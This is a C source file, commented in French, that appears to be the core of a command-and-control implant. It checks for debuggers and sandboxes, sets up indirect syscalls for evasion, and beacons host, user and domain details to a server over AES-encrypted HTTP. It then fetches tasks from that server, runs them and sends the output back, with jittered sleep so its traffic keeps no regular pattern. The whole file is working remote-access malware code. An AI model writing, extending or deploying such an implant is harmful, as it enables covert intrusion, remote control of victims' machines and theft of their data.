/*
 * demon.c - Implémentation du coeur de l'agent
 *
 * C'est ici que tout se passe : init, boucle principale, communication.
 */

#include "demon.h"
#include "../crypto/aes.h"
#include "../crypto/base64.h"
#include "../evasion/antidebug.h"
#include "../evasion/sandbox.h"
#include "../evasion/syscalls.h"
#include "../network/transport.h"
#include "../tasks/dispatcher.h"
#include "../utils/memory.h"
#include "../utils/strings.h"
#include "config.h"

#include <time.h>

/* Instance globale de l'agent */
demon_ctx_t g_demon = {0};

/* ============================================================================
 * Fonctions internes
 * ============================================================================
 */

/*
 * Calcule le temps de sleep avec jitter.
 * Ajoute une variation random pour pas avoir un pattern régulier.
 */
static DWORD calculate_sleep(void) {
  DWORD base = g_demon.config.sleep_ms;
  int jitter = g_demon.config.jitter_pct;

  if (jitter <= 0) {
    return base;
  }

  /* Calcule la variation max */
  DWORD variation = (base * jitter) / 100;

  /* Random entre -variation et +variation */
  LARGE_INTEGER counter;
  QueryPerformanceCounter(&counter);
  srand((unsigned int)(counter.LowPart ^ GetTickCount()));

  int offset = (rand() % (2 * variation + 1)) - variation;
  DWORD result = base + offset;

  /* Jamais en dessous du minimum */
  if (result < MIN_SLEEP_MS) {
    result = MIN_SLEEP_MS;
  }

  return result;
}

/*
 * Effectue les vérifications de sécurité au démarrage.
 * Retourne false si on détecte un environnement hostile.
 */
static bool security_checks(void) {
  /* Check si on est dans un debugger */
  if (is_debugger_present()) {
    /* On pourrait juste exit silencieusement ou faire du fake behavior */
    return false;
  }

  /* Check si on est dans une sandbox/VM */
  if (is_sandbox_environment()) {
    return false;
  }

  return true;
}

/*
 * Dort pendant la durée spécifiée.
 * Utilise une technique d'obfuscation pour pas être détecté.
 */
static void demon_sleep(DWORD ms) {
  /*
   * Pour l'instant on utilise un Sleep() classique.
   * TODO: Implémenter le sleep obfuscation (Ekko/Foliage)
   * qui chiffre la mémoire pendant le sleep.
   */
  Sleep(ms);
}

/* ============================================================================
 * Implémentation des fonctions publiques
 * ============================================================================
 */

int demon_init(void) {
  int status;

  /* Déjà initialisé ? */
  if (g_demon.initialized) {
    return STATUS_SUCCESS;
  }

  /* Zero tout */
  memset(&g_demon, 0, sizeof(demon_ctx_t));

  /* Checks de sécurité - on exit si environnement suspect */
  if (!security_checks()) {
    return STATUS_FAILURE;
  }

  /* Charge la configuration */
  status = config_init(&g_demon.config);
  if (status != STATUS_SUCCESS) {
    return status;
  }

  /* Initialise les syscalls indirects */
  status = syscalls_init();
  if (status != STATUS_SUCCESS) {
    config_cleanup(&g_demon.config);
    return status;
  }

  /* Initialise le transport HTTP */
  status = transport_init(&g_demon.transport, &g_demon.config);
  if (status != STATUS_SUCCESS) {
    config_cleanup(&g_demon.config);
    return status;
  }

  /* Initialise le dispatcher de tâches */
  status = dispatcher_init();
  if (status != STATUS_SUCCESS) {
    transport_cleanup(&g_demon.transport);
    config_cleanup(&g_demon.config);
    return status;
  }

  g_demon.initialized = true;
  g_demon.running = true;
  g_demon.failed_attempts = 0;

  return STATUS_SUCCESS;
}

int demon_run(void) {
  if (!g_demon.initialized) {
    return STATUS_FAILURE;
  }

  /* Premier check-in pour s'enregistrer */
  demon_checkin();

  /* Boucle principale */
  while (g_demon.running) {
    /* Récupère les tâches */
    task_t *tasks = NULL;
    int task_count = 0;

    int status = demon_get_tasks(&tasks, &task_count);

    if (status == STATUS_SUCCESS && tasks != NULL) {
      /* Exécute chaque tâche */
      for (int i = 0; i < task_count; i++) {
        task_result_t result = {0};

        /* Dispatch la tâche au bon handler */
        dispatcher_execute(&tasks[i], &result);

        /* Envoie le résultat */
        demon_send_result(&result);

        /* Cleanup */
        if (result.output) {
          secure_free(result.output, result.output_len);
        }
        if (result.data) {
          secure_free(result.data, result.data_len);
        }
      }

      /* Cleanup des tâches */
      for (int i = 0; i < task_count; i++) {
        if (tasks[i].args) {
          secure_free(tasks[i].args, tasks[i].args_len);
        }
        if (tasks[i].data) {
          secure_free(tasks[i].data, tasks[i].data_len);
        }
      }
      secure_free(tasks, task_count * sizeof(task_t));

      /* Reset le compteur d'échecs */
      g_demon.failed_attempts = 0;
    } else {
      /* Échec de communication */
      g_demon.failed_attempts++;

      /* Trop d'échecs ? On augmente le sleep */
      if (g_demon.failed_attempts > g_demon.config.max_retries) {
        /* Double le sleep time, jusqu'à un max */
        DWORD new_sleep = g_demon.config.sleep_ms * 2;
        if (new_sleep > MAX_SLEEP_MS) {
          new_sleep = MAX_SLEEP_MS;
        }
        g_demon.config.sleep_ms = new_sleep;
      }
    }

    /* Sleep avec jitter */
    DWORD sleep_time = calculate_sleep();
    demon_sleep(sleep_time);
  }

  return STATUS_SUCCESS;
}

int demon_checkin(void) {
  /*
   * Format du check-in:
   * {
   *   "action": "checkin",
   *   "id": "<agent_id>",
   *   "data": {
   *     "hostname": "...",
   *     "username": "...",
   *     "domain": "...",
   *     "os": "...",
   *     "arch": "...",
   *     "pid": 1234,
   *     "elevated": true/false
   *   }
   * }
   */

  char hostname[MAX_HOSTNAME_LEN] = {0};
  char username[MAX_USERNAME_LEN] = {0};
  char domain[MAX_DOMAIN_LEN] = {0};
  DWORD size;

  /* Récupère les infos système */
  size = MAX_HOSTNAME_LEN;
  GetComputerNameA(hostname, &size);

  size = MAX_USERNAME_LEN;
  GetUserNameA(username, &size);

  /* Domaine - on essaie via env variable */
  char *env_domain = getenv("USERDOMAIN");
  if (env_domain) {
    strncpy(domain, env_domain, MAX_DOMAIN_LEN - 1);
  }

  /* Échappe les strings pour éviter l'injection JSON */
  char *esc_hostname = json_escape(hostname);
  char *esc_username = json_escape(username);
  char *esc_domain = json_escape(domain);
  char *esc_agent_id = json_escape(g_demon.config.agent_id);

  if (!esc_hostname || !esc_username || !esc_domain || !esc_agent_id) {
    free(esc_hostname);
    free(esc_username);
    free(esc_domain);
    free(esc_agent_id);
    return STATUS_NO_MEMORY;
  }

  /* Construit le JSON manuellement (pas de lib externe) */
  char json[2048];
  snprintf(json, sizeof(json),
           "{"
           "\"action\":\"checkin\","
           "\"id\":\"%s\","
           "\"data\":{"
           "\"hostname\":\"%s\","
           "\"username\":\"%s\","
           "\"domain\":\"%s\","
           "\"os\":\"Windows\","
           "\"arch\":\"x64\","
           "\"pid\":%lu,"
           "\"elevated\":false"
           "}"
           "}",
           esc_agent_id, esc_hostname, esc_username, esc_domain,
           GetCurrentProcessId());

  free(esc_hostname);
  free(esc_username);
  free(esc_domain);
  free(esc_agent_id);

  /* Génère un IV aléatoire pour ce message */
  uint8_t random_iv[AES_BLOCK_SIZE];
  aes_generate_iv(random_iv);

  /* Chiffre avec l'IV aléatoire */
  uint8_t *encrypted = NULL;
  size_t encrypted_len = 0;

  int status =
      aes_encrypt((uint8_t *)json, strlen(json), g_demon.config.aes_key,
                  random_iv, &encrypted, &encrypted_len);

  if (status != STATUS_SUCCESS) {
    return STATUS_CRYPTO_ERROR;
  }

  /* Préfixe l'IV au ciphertext pour que le serveur puisse déchiffrer */
  size_t total_len = AES_BLOCK_SIZE + encrypted_len;
  uint8_t *iv_plus_cipher = (uint8_t *)malloc(total_len);
  if (!iv_plus_cipher) {
    secure_free(encrypted, encrypted_len);
    return STATUS_NO_MEMORY;
  }
  memcpy(iv_plus_cipher, random_iv, AES_BLOCK_SIZE);
  memcpy(iv_plus_cipher + AES_BLOCK_SIZE, encrypted, encrypted_len);
  secure_free(encrypted, encrypted_len);

  /* Encode en base64 */
  char *b64_data = base64_encode(iv_plus_cipher, total_len);
  free(iv_plus_cipher);

  if (!b64_data) {
    return STATUS_NO_MEMORY;
  }

  /* Envoie via HTTP POST */
  char *response = NULL;
  size_t response_len = 0;

  status = transport_post(&g_demon.transport, "/api/checkin", b64_data,
                          &response, &response_len);

  free(b64_data);

  if (status == STATUS_SUCCESS) {
    g_demon.last_checkin = GetTickCount();
    if (response) {
      free(response);
    }
  }

  return status;
}

int demon_get_tasks(task_t **tasks, int *task_count) {
  if (!tasks || !task_count) {
    return STATUS_FAILURE;
  }

  *tasks = NULL;
  *task_count = 0;

  /* Échappe l'agent_id */
  char *esc_agent_id = json_escape(g_demon.config.agent_id);
  if (!esc_agent_id) {
    return STATUS_NO_MEMORY;
  }

  /* Prépare la requête */
  char json[512];
  snprintf(json, sizeof(json), "{\"action\":\"get_tasks\",\"id\":\"%s\"}",
           esc_agent_id);
  free(esc_agent_id);

  /* Génère un IV aléatoire */
  uint8_t random_iv[AES_BLOCK_SIZE];
  aes_generate_iv(random_iv);

  /* Chiffre */
  uint8_t *encrypted = NULL;
  size_t encrypted_len = 0;

  int status =
      aes_encrypt((uint8_t *)json, strlen(json), g_demon.config.aes_key,
                  random_iv, &encrypted, &encrypted_len);

  if (status != STATUS_SUCCESS) {
    return STATUS_CRYPTO_ERROR;
  }

  /* Préfixe l'IV */
  size_t total_len = AES_BLOCK_SIZE + encrypted_len;
  uint8_t *iv_plus_cipher = (uint8_t *)malloc(total_len);
  if (!iv_plus_cipher) {
    secure_free(encrypted, encrypted_len);
    return STATUS_NO_MEMORY;
  }
  memcpy(iv_plus_cipher, random_iv, AES_BLOCK_SIZE);
  memcpy(iv_plus_cipher + AES_BLOCK_SIZE, encrypted, encrypted_len);
  secure_free(encrypted, encrypted_len);

  /* Base64 */
  char *b64_data = base64_encode(iv_plus_cipher, total_len);
  free(iv_plus_cipher);

  if (!b64_data) {
    return STATUS_NO_MEMORY;
  }

  /* Envoie */
  char *response = NULL;
  size_t response_len = 0;

  status = transport_post(&g_demon.transport, "/api/tasks", b64_data, &response,
                          &response_len);
  free(b64_data);

  if (status != STATUS_SUCCESS || !response) {
    return STATUS_NETWORK_ERROR;
  }

  /* Décode base64 */
  size_t decoded_len = 0;
  uint8_t *decoded = base64_decode(response, response_len, &decoded_len);
  free(response);

  if (!decoded || decoded_len < AES_BLOCK_SIZE) {
    free(decoded);
    return STATUS_CRYPTO_ERROR;
  }

  /* Extrait l'IV du début du message */
  uint8_t recv_iv[AES_BLOCK_SIZE];
  memcpy(recv_iv, decoded, AES_BLOCK_SIZE);

  /* Déchiffre avec l'IV extrait */
  uint8_t *decrypted = NULL;
  size_t decrypted_len = 0;

  status =
      aes_decrypt(decoded + AES_BLOCK_SIZE, decoded_len - AES_BLOCK_SIZE,
                  g_demon.config.aes_key, recv_iv, &decrypted, &decrypted_len);

  secure_free(decoded, decoded_len);

  if (status != STATUS_SUCCESS) {
    return STATUS_CRYPTO_ERROR;
  }

  /* Parse le JSON des tâches */
  status = dispatcher_parse_tasks((char *)decrypted, decrypted_len, tasks,
                                  task_count);
  secure_free(decrypted, decrypted_len);

  return status;
}

int demon_send_result(task_result_t *result) {
  if (!result) {
    return STATUS_FAILURE;
  }

  /* Échappe les strings */
  char *esc_agent_id = json_escape(g_demon.config.agent_id);
  char *esc_task_id = json_escape(result->task_id);
  char *esc_output = json_escape(result->output ? result->output : "");

  if (!esc_agent_id || !esc_task_id || !esc_output) {
    free(esc_agent_id);
    free(esc_task_id);
    free(esc_output);
    return STATUS_NO_MEMORY;
  }

  /* Encode données binaires en base64 */
  char *data_b64 = NULL;
  if (result->data && result->data_len > 0) {
    data_b64 = base64_encode(result->data, result->data_len);
  }

  /* Alloue un buffer assez grand */
  size_t json_size =
      1024 + strlen(esc_output) + (data_b64 ? strlen(data_b64) : 0);
  char *json = (char *)malloc(json_size);
  if (!json) {
    free(esc_agent_id);
    free(esc_task_id);
    free(esc_output);
    if (data_b64)
      free(data_b64);
    return STATUS_NO_MEMORY;
  }

  snprintf(json, json_size,
           "{"
           "\"action\":\"result\","
           "\"id\":\"%s\","
           "\"task_id\":\"%s\","
           "\"status\":%d,"
           "\"output\":\"%s\""
           "%s%s%s"
           "}",
           esc_agent_id, esc_task_id, result->status, esc_output,
           data_b64 ? ",\"data\":\"" : "", data_b64 ? data_b64 : "",
           data_b64 ? "\"" : "");

  free(esc_agent_id);
  free(esc_task_id);
  free(esc_output);
  if (data_b64)
    free(data_b64);

  /* Génère un IV aléatoire */
  uint8_t random_iv[AES_BLOCK_SIZE];
  aes_generate_iv(random_iv);

  /* Chiffre */
  uint8_t *encrypted = NULL;
  size_t encrypted_len = 0;

  int status =
      aes_encrypt((uint8_t *)json, strlen(json), g_demon.config.aes_key,
                  random_iv, &encrypted, &encrypted_len);

  free(json);

  if (status != STATUS_SUCCESS) {
    return STATUS_CRYPTO_ERROR;
  }

  /* Préfixe l'IV */
  size_t total_len = AES_BLOCK_SIZE + encrypted_len;
  uint8_t *iv_plus_cipher = (uint8_t *)malloc(total_len);
  if (!iv_plus_cipher) {
    secure_free(encrypted, encrypted_len);
    return STATUS_NO_MEMORY;
  }
  memcpy(iv_plus_cipher, random_iv, AES_BLOCK_SIZE);
  memcpy(iv_plus_cipher + AES_BLOCK_SIZE, encrypted, encrypted_len);
  secure_free(encrypted, encrypted_len);

  /* Base64 et envoie */
  char *b64_data = base64_encode(iv_plus_cipher, total_len);
  free(iv_plus_cipher);

  if (!b64_data) {
    return STATUS_NO_MEMORY;
  }

  char *response = NULL;
  size_t response_len = 0;

  status = transport_post(&g_demon.transport, "/api/result", b64_data,
                          &response, &response_len);

  free(b64_data);
  if (response)
    free(response);

  return status;
}

void demon_shutdown(void) { g_demon.running = false; }

void demon_cleanup(void) {
  if (!g_demon.initialized) {
    return;
  }

  dispatcher_cleanup();
  transport_cleanup(&g_demon.transport);
  config_cleanup(&g_demon.config);

  memset(&g_demon, 0, sizeof(demon_ctx_t));
}

/* ============================================================================
 * Point d'entrée principal - appelé depuis main.c
 * ============================================================================
 */

int demon_main(void) {
  int status = demon_init();
  if (status != STATUS_SUCCESS) {
    return status;
  }

  status = demon_run();

  demon_cleanup();

  return status;
}
